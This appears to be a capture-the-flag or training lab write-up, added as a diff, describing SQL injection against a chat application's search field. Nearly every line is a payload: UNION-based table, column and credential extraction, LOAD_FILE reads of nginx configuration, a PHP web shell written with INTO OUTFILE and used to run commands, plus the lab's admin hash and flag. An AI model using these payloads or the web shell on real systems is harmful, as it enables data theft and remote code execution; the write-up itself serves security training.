@@ -1,1 +1,17 @@
-
+# SQL LAB WRITEUP
+- first I saw the login panel but none of the fields were responsive so I skipped to register.php
+- After creating an account and logging into the application, I saw a search field that seemed suspicious to me, after checking it, I discovered another vulnerability
+- Through further experimentation, I deduced that the backend SQL query likely involved extra parentheses, This meant my injection needed to first close that initial parenthesis. The correct payload structure emerged: ') OR 1=1 -- -
+- I needed to find out how many columns the database has: ') UNION SELECT 1,2,3,4 -- -
+- Listing Tables in chattr: ') UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_schema='chattr' -- -
+- Listing Columns in Users: ') UNION SELECT 1,2,column_name,table_name FROM information_schema.columns WHERE table_name='Users' -- -
+-  Extracting Admin Credentials: ') UNION SELECT 1,2,Username,Password FROM chattr.Users -- -
+-  Reading Nginx Config: ') UNION SELECT 1,2,LOAD_FILE('/etc/nginx/nginx.conf'),4 -- -
+-  to read the default site configuration: ') UNION SELECT 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4 -- -
+-  Webshell Injection: ') UNION SELECT "", "", "<?php system($_REQUEST[0]); ?>", "" INTO OUTFILE '/var/www/chattr-prod/shell.php' -- -
+-  Then navigate to: https://<IP>:<PORT>/shell.php?0=id
+-  after searching the files I found this file: flag_876a4c.txt
+-  https://<IP>:<PORT>/shell.php?0=cat ../../../flag_876a4c.txt
+-  root /var/www/chattr-prod; root path
+-  admin password hash $argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
+-  flag: 061b1aeb94dec6bf5d9c27032b3c1d8d
